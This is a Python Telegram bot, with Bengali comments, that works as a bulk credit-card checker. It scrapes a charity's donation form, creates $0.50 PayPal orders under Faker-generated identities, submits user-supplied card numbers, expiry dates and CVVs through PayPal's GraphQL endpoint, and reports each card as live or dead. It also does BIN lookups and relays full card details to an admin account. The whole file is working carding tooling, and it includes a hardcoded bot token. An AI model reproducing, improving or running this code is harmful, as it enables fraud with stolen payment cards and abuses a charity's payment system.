import re, json, random, time, requests, os, asyncio, sys
from fake_useragent import UserAgent
from faker import Faker
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============ কনফিগারেশন ============
BOT_TOKEN = "8948469626:AAEXfCsjBH4_IhnTtIaEJ4LAbodXGq0qWx0"
ADMIN_ID = 1978055060

USERS_FILE = "users.json"
APPROVED_USERS_FILE = "approved_users.json"

fake = Faker()
processing_files = {}
BIN_CACHE = {}

# ============ রঙ কোড (CMD এর জন্য) ============
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

def log(message, color=Colors.GREEN):
    print(f"{color}{message}{Colors.RESET}")

# ============ ডাটাবেস ফাংশন ============
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)

def load_approved():
    if os.path.exists(APPROVED_USERS_FILE):
        with open(APPROVED_USERS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_approved(approved):
    with open(APPROVED_USERS_FILE, 'w') as f:
        json.dump(approved, f)

# ============ BIN LOOKUP ফাংশন ============
def get_bin_info(card_number):
    bin_num = card_number[:6]
    
    if bin_num in BIN_CACHE:
        return BIN_CACHE[bin_num]
    
    try:
        url = f"https://binlist.io/lookup/{bin_num}/"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            result = {
                'bin': bin_num,
                'brand': data.get('scheme', 'N/A').upper(),
                'type': data.get('type', 'N/A'),
                'level': data.get('level', 'N/A'),
                'bank': data.get('bank', {}).get('name', 'N/A'),
                'country': data.get('country', {}).get('name', 'N/A'),
                'country_code': data.get('country', {}).get('alpha2', 'N/A'),
                'emoji': data.get('country', {}).get('emoji', '🌍'),
                'phone': data.get('bank', {}).get('phone', 'N/A')
            }
            BIN_CACHE[bin_num] = result
            return result
    except:
        pass
    
    result = {
        'bin': bin_num,
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN',
        'level': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'country_code': 'XX',
        'emoji': '🌍',
        'phone': 'N/A'
    }
    BIN_CACHE[bin_num] = result
    return result

# ============ কার্ড চেক ফাংশন (যেভাবে CMD তে কাজ করত) ============
def check_card(card_num, card_mon, card_yer, card_cvc):
    try:
        ua = UserAgent()
        us = ua.random
        session = requests.Session()
        
        log(f"[*] Checking card: {card_num}|{card_mon}|{card_yer}|{card_cvc}", Colors.YELLOW)
        
        url = "https://www.brightercommunities.org/donate-form/"
        headers = {'User-Agent': us}
        resp = session.get(url, headers=headers, timeout=10)
        
        hash_match = re.search(r'name="give-form-hash" value="([^"]+)"', resp.text)
        form_match = re.search(r'name="give-form-id" value="([^"]+)"', resp.text)
        prefix_match = re.search(r'name="give-form-id-prefix" value="([^"]+)"', resp.text)
        
        if not hash_match or not form_match or not prefix_match:
            log("[!] Form data not found", Colors.RED)
            return "ERROR: Form data not found"
        
        hash_val = hash_match.group(1)
        form_id = form_match.group(1)
        prefix = prefix_match.group(1)
        
        order_url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
        payload = {
            'give-form-id-prefix': prefix,
            'give-form-id': form_id,
            'give-form-minimum': '0.50',
            'give-form-hash': hash_val,
            'give-amount': '0.50',
            'give_first': fake.first_name(),
            'give_last': fake.last_name(),
            'give_email': fake.email()
        }
        
        resp2 = session.post(order_url, data=payload, headers=headers, timeout=10)
        order_data = resp2.json()
        order_id = order_data.get("data", {}).get("id")
        
        if not order_id:
            log("[!] Order ID not created", Colors.RED)
            return "ERROR: Order ID not created"
        
        graphql_url = "https://www.paypal.com/graphql?fetch_credit_form_submit="
        
        first_digit = card_num[0]
        card_types = {'3': 'JCB', '4': 'VISA', '5': 'MASTERCARD', '6': 'DISCOVER'}
        card_type = card_types.get(first_digit, "UNKNOWN")
        
        query = """
            mutation payWithCard(
                $token: String!
                $card: CardInput
                $paymentToken: String
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
                $installmentTerm: Int
                $identityDocument: IdentityDocumentInput
                $feeReferenceId: String
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    paymentToken: $paymentToken
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                    installmentTerm: $installmentTerm
                    identityDocument: $identityDocument
                    feeReferenceId: $feeReferenceId
                ) {
                    flags {
                        is3DSecureRequired
                    }
                    cart {
                        intent
                        cartId
                        buyer {
                            userId
                            auth {
                                accessToken
                            }
                        }
                        returnUrl {
                            href
                        }
                    }
                    paymentContingencies {
                        threeDomainSecure {
                            status
                            method
                            redirectUrl {
                                href
                            }
                            parameter
                        }
                    }
                }
            }
        """
        
        variables = {
            "token": order_id,
            "card": {
                "cardNumber": card_num,
                "type": card_type,
                "expirationDate": f'{card_mon}/{card_yer}',
                "postalCode": fake.zipcode(),
                "securityCode": card_cvc
            },
            "phoneNumber": fake.phone_number(),
            "firstName": fake.first_name(),
            "lastName": fake.last_name(),
            "billingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode()
            },
            "shippingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode()
            },
            "email": fake.email(),
            "currencyConversionType": "PAYPAL"
        }
        
        payload_graphql = {"query": query, "variables": variables, "operationName": None}
        headers_graphql = {'User-Agent': us, 'Content-Type': 'application/json'}
        
        resp3 = session.post(graphql_url, data=json.dumps(payload_graphql), headers=headers_graphql, timeout=15)
        response_text = resp3.text
        
        log(f"[*] Response received, length: {len(response_text)}", Colors.BLUE)
        
        if "accessToken" in response_text or "cartId" in response_text:
            log(f"[+] LIVE CHARGED: {card_num}", Colors.GREEN)
            return "LIVE_CHARGED"
        elif "INVALID_SECURITY_CODE" in response_text:
            log(f"[+] CVV LIVE: {card_num}", Colors.GREEN)
            return "LIVE_CVV"
        elif "INSUFFICIENT_FUNDS" in response_text or "INVALID_BILLING_ADDRESS" in response_text:
            log(f"[+] INSUFFICIENT FUNDS: {card_num}", Colors.GREEN)
            return "LIVE_INSUFFICIENT"
        elif "EXPIRED_CARD" in response_text:
            log(f"[-] EXPIRED: {card_num}", Colors.RED)
            return "DIE_EXPIRED"
        elif "ISSUER_DECLINE" in response_text:
            log(f"[-] DECLINED: {card_num}", Colors.RED)
            return "DIE_DECLINE"
        else:
            log(f"[-] DIE: {card_num}", Colors.RED)
            return "DIE_UNKNOWN"
            
    except Exception as e:
        log(f"[!] Error: {str(e)}", Colors.RED)
        return f"ERROR: {str(e)}"

# ============ ফাইল প্রসেসিং ফাংশন ============
async def process_file_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path, user_id):
    global processing_files
    
    cards = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and '|' in line:
                    parts = line.split('|')
                    if len(parts) == 4:
                        cards.append({
                            'num': parts[0].strip(),
                            'mon': parts[1].strip(),
                            'yer': parts[2].strip()[-2:],
                            'cvc': parts[3].strip()
                        })
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {str(e)}")
        processing_files[user_id] = False
        return
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found in file!")
        processing_files[user_id] = False
        return
    
    total = len(cards)
    live_cards = []
    start_time = time.time()
    
    log(f"\n{'='*50}", Colors.YELLOW)
    log(f"[📁] FILE CHECK STARTED - Total: {total} cards", Colors.GREEN)
    log(f"{'='*50}", Colors.YELLOW)
    
    progress_msg = await update.message.reply_text(
        f"📁 FILE CHECK STARTED\n━━━━━━━━━━━━━━━━\n"
        f"📊 Total Cards: {total}\n"
        f"⏳ Progress: 0/{total} (0%)\n"
        f"✅ Live Found: 0\n"
        f"⏱️ Elapsed: 0s\n━━━━━━━━━━━━━━━━\n\n🔄 Starting check..."
    )
    
    for i, card in enumerate(cards, 1):
        if not processing_files.get(user_id, True):
            await progress_msg.delete()
            await update.message.reply_text("⏹️ File check cancelled!")
            return
        
        log(f"[{i}/{total}] Checking: {card['num'][:4]}****{card['num'][-4:]}", Colors.BLUE)
        
        result = check_card(card['num'], card['mon'], card['yer'], card['cvc'])
        
        elapsed = int(time.time() - start_time)
        percent = int((i / total) * 100)
        
        if result in ["LIVE_CHARGED", "LIVE_CVV", "LIVE_INSUFFICIENT"]:
            live_cards.append({
                'card': card,
                'result': result
            })
            
            if result == "LIVE_CHARGED":
                status = "🔥 CHARGED"
                icon = "🔥"
            elif result == "LIVE_CVV":
                status = "⚡️ CVV LIVE"
                icon = "⚡️"
            else:
                status = "💰 INSUFFICIENT"
                icon = "💰"
            
            bin_info = get_bin_info(card['num'])
            
            live_msg = f"""✅ LIVE CARD FOUND! #{len(live_cards)} {icon}

💳 `{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}`
📊 {status}
🏦 {bin_info['brand']} - {bin_info['country']}
📊 BIN: {bin_info['bin']}"""
            
            await update.message.reply_text(live_msg, parse_mode='Markdown')
            log(f"[+] LIVE #{len(live_cards)}: {card['num']}", Colors.GREEN)
        
        avg_time = elapsed / i if i > 0 else 0
        remaining = int((total - i) * avg_time) if avg_time > 0 else 0
        
        try:
            await progress_msg.edit_text(
                f"📁 FILE CHECK IN PROGRESS\n━━━━━━━━━━━━━━━━\n"
                f"📊 Total: {total}\n"
                f"⏳ Progress: {i}/{total} ({percent}%)\n"
                f"✅ Live: {len(live_cards)}\n"
                f"⏱️ Elapsed: {elapsed}s\n"
                f"🕐 ETA: {remaining}s\n━━━━━━━━━━━━━━━━\n\n"
                f"🔄 Checking: `{card['num'][:4]}****{card['num'][-4:]}`\n"
                f"⚡ Speed: {avg_time:.1f}s/card"
            )
        except:
            pass
        
        await asyncio.sleep(1.5)
    
    await progress_msg.delete()
    
    total_time = int(time.time() - start_time)
    
    log(f"\n{'='*50}", Colors.YELLOW)
    log(f"[📁] FILE CHECK COMPLETE", Colors.GREEN)
    log(f"Total: {total} | Live: {len(live_cards)} | Time: {total_time}s", Colors.GREEN)
    log(f"{'='*50}\n", Colors.YELLOW)
    
    if live_cards:
        live_list = "✅ LIVE CARDS FOUND\n━━━━━━━━━━━━━━━━\n"
        for idx, lc in enumerate(live_cards, 1):
            if lc['result'] == "LIVE_CHARGED":
                icon = "🔥"
                status = "CHARGED"
            elif lc['result'] == "LIVE_CVV":
                icon = "⚡️"
                status = "CVV"
            else:
                icon = "💰"
                status = "INSF"
            live_list += f"{idx}. {icon} `{lc['card']['num']}|{lc['card']['mon']}|{lc['card']['yer']}|{lc['card']['cvc']}` [{status}]\n"
    else:
        live_list = "❌ No live cards found!"
    
    final_report = f"""📁 FILE CHECK COMPLETE
━━━━━━━━━━━━━━━━
📊 STATISTICS:
• Total Cards: {total}
• Live Cards: {len(live_cards)}
• Dead Cards: {total - len(live_cards)}
• Success Rate: {(len(live_cards)/total*100):.1f}%

⏱️ TIME:
• Duration: {total_time} seconds
• Average: {total_time/total:.1f}s/card

{live_list}
━━━━━━━━━━━━━━━━"""
    
    await update.message.reply_text(final_report, parse_mode='Markdown')
    
    admin_report = f"📁 FILE CHECK\n👤 {update.effective_user.first_name}\n📊 {total} cards\n✅ {len(live_cards)} live\n⏱️ {total_time}s"
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_report)
    
    processing_files[user_id] = False

# ============ টেলিগ্রাম হ্যান্ডলার ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            'name': user_name,
            'username': update.effective_user.username,
            'date': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        save_users(users)
        
        admin_text = f"""🆕 NEW USER REGISTERED!

👤 Name: {user_name}
🆔 ID: <code>{user_id}</code>
📛 Username: @{update.effective_user.username}
📅 Date: {users[str(user_id)]['date']}

🔓 Approve Command:
<code>/approve {user_id}</code>"""
        
        keyboard = [[InlineKeyboardButton("📋 COPY COMMAND", callback_data=f"copy_{user_id}")]]
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        
        log(f"[👤] NEW USER: {user_name} ({user_id})", Colors.YELLOW)
    
    approved_users = load_approved()
    
    welcome_text = f"""🔥 CARD CHECKER BOT v3.0

Welcome {user_name}!

━━━━━━━━━━━━━━━━
📌 STATUS: {'✅ APPROVED' if user_id in approved_users else '⏳ PENDING APPROVAL'}
━━━━━━━━━━━━━━━━

⚡️ FEATURES:
• Single Card Check
• Bulk File Check with Live Progress
• BIN Lookup with Country/Bank Info
• Copy Card Details
• Multi-User Support

💡 HOW TO USE:

1️⃣ SINGLE CHECK:
Send: `number|month|year|cvv`
Example: `4000000000000000|12|2026|123`

2️⃣ FILE CHECK:
Send a .txt file with one card per line:
`card|month|year|cvv`

3️⃣ BIN LOOKUP:
Send first 6 digits of card

━━━━━━━━━━━━━━━━
👑 Bot by @thispersonisbrand
"""
    
    keyboard = []
    if user_id in approved_users:
        keyboard = [
            [InlineKeyboardButton("🔍 SINGLE CHECK", callback_data='single_check')],
            [InlineKeyboardButton("📁 FILE CHECK", callback_data='file_check')],
            [InlineKeyboardButton("ℹ️ BIN LOOKUP", callback_data='bin_lookup')],
            [InlineKeyboardButton("📊 MY INFO", callback_data='my_info')]
        ]
    else:
        keyboard = [[InlineKeyboardButton("⏳ WAITING APPROVAL", callback_data='waiting')]]
    
    await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    try:
        user_id = int(context.args[0])
        approved_users = load_approved()
        
        if user_id not in approved_users:
            approved_users.append(user_id)
            save_approved(approved_users)
            
            await update.message.reply_text(f"✅ User {user_id} has been approved!")
            log(f"[👑] APPROVED: User {user_id}", Colors.GREEN)
            
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text="✅ CONGRATULATIONS! You have been approved!\n\nYou can now use the bot.\nSend /start to continue."
                )
            except:
                pass
        else:
            await update.message.reply_text(f"⚠️ User {user_id} is already approved!")
    except:
        await update.message.reply_text("❌ Usage: /approve <user_id>\nExample: /approve 123456789")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    try:
        user_id = int(context.args[0])
        approved_users = load_approved()
        
        if user_id in approved_users:
            approved_users.remove(user_id)
            save_approved(approved_users)
            
            await update.message.reply_text(f"✅ User {user_id} has been removed!")
            log(f"[👑] REMOVED: User {user_id}", Colors.RED)
            
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text="⚠️ Your access has been revoked by admin!"
                )
            except:
                pass
        else:
            await update.message.reply_text(f"⚠️ User {user_id} not found!")
    except:
        await update.message.reply_text("❌ Usage: /remove <user_id>\nExample: /remove 123456789")

async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    users = load_users()
    approved = load_approved()
    
    text = "📊 USERS LIST\n━━━━━━━━━━━━━━━━\n\n"
    
    pending_list = []
    approved_list = []
    
    for uid, info in users.items():
        uid_int = int(uid)
        if uid_int in approved:
            approved_list.append(f"✅ {info['name']} - `{uid}`")
        else:
            pending_list.append(f"⏳ {info['name']} - `{uid}`")
    
    if pending_list:
        text += "⏳ PENDING USERS:\n" + "\n".join(pending_list) + f"\n\nTotal: {len(pending_list)}\n\n"
    
    if approved_list:
        text += "✅ APPROVED USERS:\n" + "\n".join(approved_list) + f"\n\nTotal: {len(approved_list)}\n\n"
    
    text += f"━━━━━━━━━━━━━━━━\n📊 Total Users: {len(users)}"
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    if user_id not in load_approved():
        await query.message.reply_text("❌ You are not approved yet!\nWait for admin approval.")
        return
    
    await query.message.reply_text(
        "🔍 SINGLE CARD CHECK\n━━━━━━━━━━━━━━━━\n\n"
        "Send card in this format:\n"
        "`number|month|year|cvv`\n\n"
        "Example:\n"
        "`4000000000000000|12|2026|123`\n\n"
        "Type or paste your card:",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_card'] = True

async def file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    if user_id not in load_approved():
        await query.message.reply_text("❌ You are not approved yet!\nWait for admin approval.")
        return
    
    await query.message.reply_text(
        "📁 FILE CHECK\n━━━━━━━━━━━━━━━━\n\n"
        "Send a .txt file containing cards.\n\n"
        "Format (one per line):\n"
        "`card|month|year|cvv`\n\n"
        "Example file content:\n"
        "`4000000000000000|12|2026|123`\n"
        "`4111111111111111|01|2027|456`\n\n"
        "⚠️ Progress will be shown live!",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_file'] = True

async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    if user_id not in load_approved():
        await query.message.reply_text("❌ You are not approved yet!\nWait for admin approval.")
        return
    
    await query.message.reply_text(
        "🔍 BIN LOOKUP\n━━━━━━━━━━━━━━━━\n\n"
        "Send first 6 digits of the card:\n"
        "Example: `400000`\n\n"
        "I will show:\n"
        "• Card Brand (Visa/Mastercard)\n"
        "• Card Type (Credit/Debit)\n"
        "• Issuing Bank\n"
        "• Country",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_bin'] = True

async def my_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    approved_users = load_approved()
    
    text = f"""📊 MY INFORMATION
━━━━━━━━━━━━━━━━

👤 Name: {user.first_name}
🆔 ID: `{user.id}`
📛 Username: @{user.username}
⭐️ Premium: {'Yes' if user.is_premium else 'No'}
✅ Status: {'Approved' if user.id in approved_users else 'Pending'}

📅 Joined: {load_users().get(str(user.id), {}).get('date', 'Unknown')}
━━━━━━━━━━━━━━━━"""
    
    await query.message.reply_text(text, parse_mode='Markdown')

async def waiting(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.reply_text(
        "⏳ ACCOUNT PENDING APPROVAL\n━━━━━━━━━━━━━━━━\n\n"
        "Your account is waiting for admin approval.\n\n"
        "Please be patient. You will receive a notification once approved.\n\n"
        "Thank you for your patience!"
    )

async def handle_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_card'):
        return
    
    user_id = update.effective_user.id
    if user_id not in load_approved():
        await update.message.reply_text("❌ You are not approved!")
        context.user_data['awaiting_card'] = False
        return
    
    card_text = update.message.text.strip()
    parts = card_text.split('|')
    
    if len(parts) != 4:
        await update.message.reply_text(
            "❌ INVALID FORMAT!\n━━━━━━━━━━━━━━━━\n\n"
            "Please use this format:\n"
            "`number|month|year|cvv`\n\n"
            "Example:\n"
            "`4000000000000000|12|2026|123`",
            parse_mode='Markdown'
        )
        return
    
    card_num = parts[0].strip()
    card_mon = parts[1].strip()
    card_yer = parts[2].strip()
    card_cvc = parts[3].strip()
    
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    bin_info = get_bin_info(card_num)
    
    status_msg = await update.message.reply_text("⏳ CHECKING CARD...\n\nPlease wait...")
    start_time = time.time()
    
    log(f"\n{'='*50}", Colors.YELLOW)
    log(f"[🔍] SINGLE CHECK: {card_num}|{card_mon}|{card_yer}|{card_cvc}", Colors.BLUE)
    
    result = check_card(card_num, card_mon, card_yer, card_cvc)
    
    elapsed = int(time.time() - start_time)
    await status_msg.delete()
    
    if result == "LIVE_CHARGED":
        status = "✅ LIVE CHARGED"
        status_emoji = "🔥"
        details = "• $0.50 Charged Successfully\n• Card is Active & Valid"
    elif result == "LIVE_CVV":
        status = "⚡️ CVV LIVE"
        status_emoji = "💳"
        details = "• CVV is Correct\n• Card is Valid"
    elif result == "LIVE_INSUFFICIENT":
        status = "💰 LIVE - INSUFFICIENT"
        status_emoji = "💵"
        details = "• Card Valid\n• Insufficient Balance"
    elif result.startswith("ERROR"):
        status = "⚠️ ERROR"
        status_emoji = "❌"
        details = f"• {result}"
    else:
        status = "❌ DIE"
        status_emoji = "💀"
        details = "• Card Invalid/Expired\n• Cannot be used"
    
    result_text = f"""{status_emoji} CARD CHECK RESULT {status_emoji}
━━━━━━━━━━━━━━━━
{status}
━━━━━━━━━━━━━━━━

💳 CARD DETAILS:
• Number: `{card_num}`
• Month: {card_mon}
• Year: 20{card_yer}
• CVV: {card_cvc}

🏦 BIN INFORMATION:
• BIN: {bin_info['bin']}
• Brand: {bin_info['brand']}
• Type: {bin_info['type']}
• Level: {bin_info['level']}
• Bank: {bin_info['bank']}
• Country: {bin_info['emoji']} {bin_info['country']}
• Phone: {bin_info['phone']}

📊 STATUS INFO:
{details}

⏱️ TIME TAKEN: {elapsed} seconds
━━━━━━━━━━━━━━━━"""
    
    card_details = f"{card_num}|{card_mon}|{card_yer}|{card_cvc}"
    keyboard = [[InlineKeyboardButton("📋 COPY CARD", callback_data=f"copy_{card_details}")]]
    
    await update.message.reply_text(result_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    
    log(f"[🔍] RESULT: {status}", Colors.GREEN if "LIVE" in status else Colors.RED)
    log(f"{'='*50}\n", Colors.YELLOW)
    
    admin_msg = f"🔔 CARD CHECKED\n👤 {update.effective_user.first_name}\n💳 {card_num}|{card_mon}|{card_yer}|{card_cvc}\n📊 {status}\n⏱️ {elapsed}s"
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
    
    context.user_data['awaiting_card'] = False

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_file'):
        return
    
    user_id = update.effective_user.id
    if user_id not in load_approved():
        await update.message.reply_text("❌ You are not approved!")
        context.user_data['awaiting_file'] = False
        return
    
    if processing_files.get(user_id, False):
        await update.message.reply_text(
            "⚠️ FILE CHECK ALREADY RUNNING!\n━━━━━━━━━━━━━━━━\n\n"
            "You already have a file check in progress.\n"
            "Please wait for it to complete before starting another one."
        )
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            "❌ INVALID FILE TYPE!\n━━━━━━━━━━━━━━━━\n\n"
            "Please send a .txt file only.\n\n"
            "Format:\n"
            "`card|month|year|cvv`\n\n"
            "Example:\n"
            "`4000000000000000|12|2026|123`",
            parse_mode='Markdown'
        )
        return
    
    status_msg = await update.message.reply_text("📥 DOWNLOADING FILE...")
    file = await context.bot.get_file(document.file_id)
    file_path = f"temp_{user_id}_{int(time.time())}.txt"
    await file.download_to_drive(file_path)
    await status_msg.delete()
    
    processing_files[user_id] = True
    await process_file_cards(update, context, file_path, user_id)
    
    if os.path.exists(file_path):
        os.remove(file_path)
    
    context.user_data['awaiting_file'] = False

async def handle_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_bin'):
        return
    
    user_id = update.effective_user.id
    if user_id not in load_approved():
        await update.message.reply_text("❌ You are not approved!")
        context.user_data['awaiting_bin'] = False
        return
    
    bin_num = update.message.text.strip()[:6]
    
    if not bin_num.isdigit() or len(bin_num) < 6:
        await update.message.reply_text(
            "❌ INVALID BIN!\n━━━━━━━━━━━━━━━━\n\n"
            "Please send first 6 digits of the card.\n"
            "Example: `400000`",
            parse_mode='Markdown'
        )
        return
    
    bin_info = get_bin_info(bin_num)
    
    text = f"""🔍 BIN LOOKUP RESULT
━━━━━━━━━━━━━━━━

📊 BIN NUMBER: {bin_info['bin']}

💳 CARD INFORMATION:
• Brand: {bin_info['brand']}
• Type: {bin_info['type']}
• Level: {bin_info['level']}

🏦 BANK INFORMATION:
• Bank Name: {bin_info['bank']}
• Bank Phone: {bin_info['phone']}

🌍 COUNTRY INFORMATION:
• Country: {bin_info['emoji']} {bin_info['country']}
• Country Code: {bin_info['country_code']}
━━━━━━━━━━━━━━━━"""
    
    keyboard = [[InlineKeyboardButton("🔄 CHECK ANOTHER", callback_data='bin_lookup')]]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    context.user_data['awaiting_bin'] = False

async def copy_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    if data.startswith("copy_"):
        card_details = data.replace("copy_", "")
        await query.answer(f"✅ Copied: {card_details}", show_alert=True)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log(f"[!] ERROR: {context.error}", Colors.RED)
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "⚠️ AN ERROR OCCURRED!\n━━━━━━━━━━━━━━━━\n\n"
                "Please try again later.\n"
                "If the problem persists, contact admin."
            )
    except:
        pass

# ============ মেইন ফাংশন ============
def main():
    log("\n" + "="*50, Colors.YELLOW)
    log("🤖 CARD CHECKER BOT STARTING...", Colors.GREEN)
    log("="*50, Colors.YELLOW)
    
    # বট তৈরি
    application = Application.builder().token(BOT_TOKEN).build()
    
    # কমান্ড হ্যান্ডলার
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", users_list))
    
    # কলব্যাক হ্যান্ডলার
    application.add_handler(CallbackQueryHandler(single_check, pattern='single_check'))
    application.add_handler(CallbackQueryHandler(file_check, pattern='file_check'))
    application.add_handler(CallbackQueryHandler(bin_lookup, pattern='bin_lookup'))
    application.add_handler(CallbackQueryHandler(my_info, pattern='my_info'))
    application.add_handler(CallbackQueryHandler(waiting, pattern='waiting'))
    application.add_handler(CallbackQueryHandler(copy_card, pattern='^copy_'))
    
    # মেসেজ হ্যান্ডলার
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_card))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bin))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # এরর হ্যান্ডলার
    application.add_error_handler(error_handler)
    
    log(f"✅ Bot Token: {BOT_TOKEN[:10]}...", Colors.GREEN)
    log(f"✅ Admin ID: {ADMIN_ID}", Colors.GREEN)
    log(f"✅ Multi-User Mode: ENABLED", Colors.GREEN)
    log(f"✅ File Processing: READY", Colors.GREEN)
    log("="*50, Colors.YELLOW)
    log("📱 Bot is running... Press Ctrl+C to stop", Colors.BLUE)
    log("="*50 + "\n", Colors.YELLOW)
    
    # পোলিং শুরু
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        log("\n\n⚠️ Bot stopped by user!", Colors.RED)
        sys.exit(0)
    except Exception as e:
        log(f"\n\n❌ Fatal Error: {e}", Colors.RED)
        sys.exit(1)
